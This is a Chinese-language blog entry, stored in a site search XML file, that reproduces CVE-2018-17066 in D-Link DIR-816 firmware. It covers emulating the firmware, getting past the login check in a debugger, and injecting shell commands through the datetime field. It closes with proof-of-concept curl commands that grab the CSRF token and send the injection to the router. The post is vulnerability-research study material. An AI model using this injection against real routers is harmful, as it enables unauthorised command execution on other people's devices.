<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DIR-816</title>
      <link href="/2024/03/15/test/"/>
      <url>/2024/03/15/test/</url>
      
        <content type="html"><![CDATA[<p>下载固件、binwalk提取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me xxx</span><br></pre></td></tr></table></figure><p>一般web根目录可以用该命令找出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name &#x27;&#x27;*index*&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>漏洞编号：CVE-2018-17066</p><span id="more"></span><p>改漏洞在&#x2F;bin&#x2F;goahead程序中<br><img src="/2024/03/15/test/1699874649517-3352471b-cf5e-4b2a-b9e8-c2ce12a15129.png"><br><img src="/2024/03/15/test/1699874668792-d90ca29f-5847-4cbe-8075-5de53e4564bb.png"><br>dosystem中没有对Var进行任何检测，开始想的是可以直接输入字符，但web页面对输入进行了检测，这里要用到命令注入（转战web XD），修改datetime的值。</p><h4 id="固件下载："><a href="#固件下载：" class="headerlink" title="固件下载："></a>固件下载：</h4><p>这个固件可以从官网下载：<a href="http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-816">http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-816</a><br><img src="/2024/03/15/test/1699875801623-63f2e896-4890-4cd2-81d9-9abc4e1472d7.png"><br>下载之后binwalk解包得到squashfs-root（自带的binwalk一直有问题qwq，搞了好久）</p><h4 id="qemu模拟"><a href="#qemu模拟" class="headerlink" title="qemu模拟"></a>qemu模拟</h4><p>因为明确是goahead程序，直接启动试一试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-mipsel -L ./ ./bin/goahead</span><br></pre></td></tr></table></figure><p>卡在等待nvram_daemon，可以进ida看看<br><img src="/2024/03/15/test/1699876254348-b5b07fca-60fb-411e-9215-317c0ebceb02.png"><br>通过字符串查找可以找到这里，程序要打开nvramd.pid文件，但我们解包的固件var下是空但，所以会卡在这里，本地实现的话可以动态调试把v1改为1，跳出循环<br><img src="/2024/03/15/test/1699876354996-be2615c7-795e-4504-a71d-0718485b1688.png"></p><p>打个断点</p><p><img src="/2024/03/15/test/1699876606686-be56212c-39b0-4362-8dd4-7443f3661d73.png"></p><p>再试一试</p><p><img src="/2024/03/15/test/1699876684428-f000e68d-574a-4cb6-b5e4-a5a283019de5.png"></p><p>继续执行会直接退出了，发现有新问题，一样利用字符串搜索看一下</p><p><img src="/2024/03/15/test/1699876732651-01e356c2-61f3-4da9-933c-16d37e57728d.png"></p><p>这里停在判断nvram_bufget获取lan_ipaddr的值，同样打个断点修改v19的值就好</p><p><img src="/2024/03/15/test/1699876833057-8e9a7cbf-249d-4e7a-b101-443d565e8e0a.png"></p><p><img src="/2024/03/15/test/1699876848152-c2fc6849-ee92-4bd2-9921-840a4fbcb175.png"></p><p>然后继续运行，就正常的在跑了</p><p><img src="/2024/03/15/test/1699877418646-41629a6f-e844-47ba-9e23-13ff8ebf1b38.png"></p><h4 id="web端"><a href="#web端" class="headerlink" title="web端"></a>web端</h4><p>然后我们就可以去访问web页面了，先随便输一下用户和密码</p><p><img src="/2024/03/15/test/1699878668040-40475782-131d-4368-91c2-d5ce676f7fd6.png"></p><p><img src="/2024/03/15/test/1699878846410-e91ebfa7-e1ec-4562-be81-66b3de4d8ff4.png"></p><p>此时ida停在了对password判断位置，这里可以大致看一下程序、从web端得到username和password进行decode64之后与nvram_bufgey得到的用strcmp比较、既然用的strcmp我们可以直接为空来绕过</p><p><img src="/2024/03/15/test/1699879307042-a7ca45aa-08e3-4770-b69d-16caa2ea5889.png"></p><p>不过web页面限制了必须输入用户名，不过我们依然可以在ida中直接去修改（看师傅说可以改前端 不会XD）</p><p><img src="/2024/03/15/test/1699879458579-7c590496-9df3-42a4-b798-83d843b2411a.png"></p><p>这里是对username的判断后的跳转，把v0设置为0即可，然后就可以登录成功了</p><p>我们去访问d_wizard_step1_start.asp，找到漏洞触发点（更新时间）</p><p><img src="/2024/03/15/test/1699880148219-55f07052-8b74-48a7-8337-4896c233ad8c.png"></p><p><img src="/2024/03/15/test/1699880242330-4b6652e6-b2fc-4788-9771-e3eb8b1ff1db.png"></p><p>这里web页面对输入有限制，可以利用burp suite进行抓包修改发送的数据</p><p><img src="/2024/03/15/test/1699880267787-b0729969-6804-4cb1-bf79-bb5bf6e4ca9f.png"></p><p>（自己电脑bp可能是环境配置问题吧、一直没搞好 暂时用的kali自己带的）</p><p>这里以ls为例</p><p><img src="/2024/03/15/test/1699880462339-4f9dc3c0-f803-4820-b3c6-f2e561f118e4.png"></p><p><img src="/2024/03/15/test/1699880493776-79e480b6-866b-48b3-b94e-2c4ac4a0f337.png"></p><h4 id="概念验证（官方）"><a href="#概念验证（官方）" class="headerlink" title="概念验证（官方）"></a>概念验证（官方）</h4><p>路由需要一个随机令牌，该令牌用作针对 CSRF 的缓解措施。因此，首先我们需要获取它的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TOKENID=`curl -s http://192.168.0.1/dir_login.asp | grep tokenid | head -1 | grep -o &#x27;value=&quot;[0-9]*&quot;&#x27; | cut -f 2 -d = | tr -d &#x27;&quot;&#x27;`</span><br></pre></td></tr></table></figure><p>然后，我们可以将构建的参数与令牌一起发送到路由：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST http://192.168.0.1/goform/form2systime.cgi -d tokenid=$TOKENID -d &#x27;datetime=`sleep 5`-:&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
